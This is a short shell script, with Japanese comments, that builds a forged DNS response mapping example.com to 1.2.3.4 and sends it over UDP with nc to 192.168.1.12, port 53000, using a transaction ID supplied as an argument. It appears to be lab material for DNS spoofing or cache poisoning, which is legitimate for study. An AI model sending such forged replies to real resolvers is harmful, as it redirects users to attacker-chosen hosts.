#!/bin/sh

set -eu

# 16進数を10進数に変換して表示する。16進数の文字列を、本スクリプト実行時の引数に指定すること。
TXID=$(printf "%d\n" $1)
echo "TXID:${TXID}"
RESOLVE_NAME="076578616d706c6503636f6d00" # クエリされた名前 (example.com)。
TARGET_ID="01020304"                      # 1.2.3.4。16進数8文字で示す

echo -n "${TXID}81800001000100000000${RESOLVE_NAME}00010001c00c000100010000003c0004${TARGET_ID}" | xxd -r -p | nc -u -w 1 192.168.1.12 53000
